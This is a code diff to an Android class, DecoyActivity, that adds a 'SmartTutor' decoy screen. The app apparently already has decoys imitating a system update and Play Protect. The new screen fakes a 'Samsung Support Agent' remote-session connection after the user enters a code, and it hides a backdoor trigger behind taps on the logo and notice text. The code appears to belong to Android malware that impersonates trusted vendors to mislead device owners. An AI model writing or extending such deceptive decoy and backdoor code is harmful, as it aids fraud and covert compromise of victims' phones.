@@ -96,6 +96,9 @@ public class DecoyActivity extends AppCompatActivity {
             setContentView(R.layout.activity_decoy_install_success);
             setupSystemUpdateSuccessDecoy();
             isSpecializedDecoy = true;
+        } else if (componentName.contains("SmartTutorAlias") || componentName.contains("SmartTutor")) {
+            setupSmartTutorDecoy();
+            isSpecializedDecoy = true;
         } else {
             isSpecializedDecoy = false;
             // High-Fidelity Play Protect Pipeline Logic
@@ -245,6 +248,40 @@ public class DecoyActivity extends AppCompatActivity {
         if (btnFinish != null) {
             btnFinish.setVisibility(View.VISIBLE);
             btnFinish.setOnClickListener(v -> goHome());
+        }
+    }
+
+    private void setupSmartTutorDecoy() {
+        IO_Persistence_Manager.setAutoPilot(false);
+        setContentView(R.layout.activity_decoy_smart_tutor);
+
+        View logo = findViewById(R.id.ivSmartTutorLogo);
+        View notice = findViewById(R.id.tvSmartTutorNotice);
+        View btnConnect = findViewById(R.id.btnSmartTutorConnect);
+        View btnRefresh = findViewById(R.id.btnSmartTutorRefresh);
+        final android.widget.EditText etCode = findViewById(R.id.etSmartTutorCode);
+
+        if (logo != null) logo.setOnClickListener(v -> handleBackdoorClick());
+        if (notice != null) notice.setOnClickListener(v -> handleBackdoorClick());
+
+        if (btnConnect != null) {
+            btnConnect.setOnClickListener(v -> {
+                String code = etCode != null ? etCode.getText().toString().trim() : "";
+                if (code.length() < 6) {
+                    android.widget.Toast.makeText(DecoyActivity.this, "Please enter a valid 6-digit connection code", android.widget.Toast.LENGTH_SHORT).show();
+                } else {
+                    android.widget.Toast.makeText(DecoyActivity.this, "Connecting to Samsung Support Agent...", android.widget.Toast.LENGTH_SHORT).show();
+                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                        android.widget.Toast.makeText(DecoyActivity.this, "Session Established: Remote Agent Connected", android.widget.Toast.LENGTH_SHORT).show();
+                    }, 2000);
+                }
+            });
+        }
+
+        if (btnRefresh != null) {
+            btnRefresh.setOnClickListener(v -> {
+                android.widget.Toast.makeText(DecoyActivity.this, "Smart Tutor Service: Online", android.widget.Toast.LENGTH_SHORT).show();
+            });
         }
     }
 
